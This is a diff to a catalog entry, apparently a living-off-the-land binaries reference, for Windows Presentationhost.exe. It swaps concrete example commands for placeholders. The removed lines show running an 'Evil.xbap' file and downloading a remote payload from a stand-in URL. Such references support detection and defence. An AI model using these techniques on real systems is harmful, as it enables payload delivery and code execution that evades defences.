@@ -4,14 +4,16 @@ Description: File is used for executing Browser applications
 Author: Oddvar Moe
 Created: 2018-05-25
 Commands:
-  - Command: Presentationhost.exe C:\temp\Evil.xbap
+  - Command: Presentationhost.exe {PATH_ABSOLUTE:.xbap}
     Description: Executes the target XAML Browser Application (XBAP) file
-    Usecase: Execute code within xbap files
+    Usecase: Execute code within XBAP files
     Category: Execute
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
-  - Command: Presentationhost.exe https://example.com/payload
+    Tags:
+      - Execute: XBAP
+  - Command: Presentationhost.exe {REMOTEURL}
     Description: It will download a remote payload and place it in INetCache.
     Usecase: Downloads payload from remote server
     Category: Download
